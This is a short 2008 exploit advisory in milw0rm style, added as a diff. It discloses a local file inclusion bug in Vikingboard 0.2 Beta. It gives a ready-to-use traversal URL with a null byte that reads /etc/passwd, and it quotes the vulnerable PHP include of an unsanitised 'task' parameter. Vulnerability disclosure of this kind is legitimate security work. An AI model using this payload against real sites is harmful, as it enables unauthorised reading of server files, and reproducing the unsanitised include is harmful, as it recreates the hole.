@@ -1,0 +1,61 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ #######################################################################
+ #  [ Vikingboard <= 0.2 Beta ]   Local File Inclusion Vulnerability   #
+ #######################################################################
+ #
+ # Script: "Vikingboard is a PHP-based discussion forum..."
+ #
+ # Script site: http://vikingboard.com/
+ # Download: http://sourceforge.net/projects/vboard/
+ #
+ # Vuln: 
+ # http://site.com/[Vikingboard_0.2_Beta]/upload/index.php?act=task&task=./../../../../../../../etc/passwd%00
+ #
+ #
+ # Bug: ./Vikingboard_0.2_Beta/upload/index.php (lines: 81-91)
+ #
+ # ...
+ # 81:		switch(ifsetor($_GET['act'], false))
+ # 82:		{
+ #		 ...
+ # 88:		 case 'task':
+ # 89:		 require('./inc/lib/task_loader.php');				// (1)
+ # 90:		 load_task();							// (2)	
+ # 91:		 break;
+ # ... 			    
+ #
+ #
+ # Bug: ./Vikingboard_0.2_Beta/upload/inc/lib/task_loader.php (lines: 19-44)
+ #
+ # ...
+ # 19: 		function load_task()
+ # 20: 		{
+ #		   ...
+ # 27:		   if (!include("inc/tasks/task_{$_GET['task']}.php"))  	// (3) LFI
+ # 28:		   {
+ # 29:		      //	Stop the script if the task does not exist
+ # 30:		      die();
+ # 31:		   }
+ #		....
+ # 44:		}
+ # ... 			    
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-25]
